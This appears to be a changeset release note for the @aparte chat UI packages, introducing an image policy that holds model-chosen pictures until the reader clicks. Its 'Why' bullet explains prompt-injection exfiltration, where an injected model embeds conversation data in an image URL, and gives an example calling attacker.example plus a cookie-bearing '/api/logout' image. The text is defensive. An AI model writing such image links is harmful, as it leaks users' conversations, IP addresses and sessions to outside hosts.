---
'@aparte/core': major
'@aparte/plugin-streaming-markdown': major
'@aparte/plugin-cards': major
'@aparte/locales': minor
---

A picture a model or a tool chose no longer loads by itself: `data:` and `blob:` pictures do, and any other shows as a link naming its host until the reader clicks it. To load your own, call `aparteGlobalConfig.setImagePolicy(['self', 'https://cdn.example.com'])`; `['*']` loads every picture, as before.

- **Why.** A picture fetches its address the moment it is shown, before anyone reads the reply, and a prompt-injected model can write the conversation into that address: `![](https://attacker.example/c.png?d=…)` sent it, the reader's IP and their browser to that host with no click — while the reply streamed, and again each time the conversation was shown. The page's own site is not trusted by default either: its pictures carry the reader's cookies (`![](/api/logout)`), and an open redirect on it turns a picture from the site into a picture from anywhere.
- **In a reply.** A held picture is a small link that says where it would load from (inside a link of the reply's own, a button, so that link stays whole). A click loads it in place, and the chat remembers the choice; a click with a modifier key is left to the browser, as for any link. `config.sanitizeHtml` applies the policy after whichever sanitizer is set, so DOMPurify or your own keeps it, and `@aparte/plugin-streaming-markdown` applies it before any `src` is set, so nothing is fetched while a reply streams. A picture's own address decides; of its `srcset`, only the candidates that load are kept, written again so a browser can only pick an address that was judged.
- **In a card.** `@aparte/plugin-cards` draws a card without the pictures the policy held, and one "Show images" button with every host they would load from beside it; pressing it draws them. A card of your own asks through `ctx.image(src, props)` and `ctx.loads(url)`.
- **The rule.** `setImagePolicy` takes a list (`'self'`, `'*'`, origins) or a function `(url) => 'load' | 'hold' | 'drop'`. `config.decideImage(url)` answers for a plugin that draws pictures itself, and `config.showImage(url)` records the reader's choice. Every picture that loads goes with `referrerpolicy="no-referrer"`. A CSP `img-src` is the stronger rule beside it: it also checks where a redirect leads.
- Two locale keys, `imageLoad` and `imageLoadNamed`, name a held picture; `@aparte/locales` carries them in its nine languages.
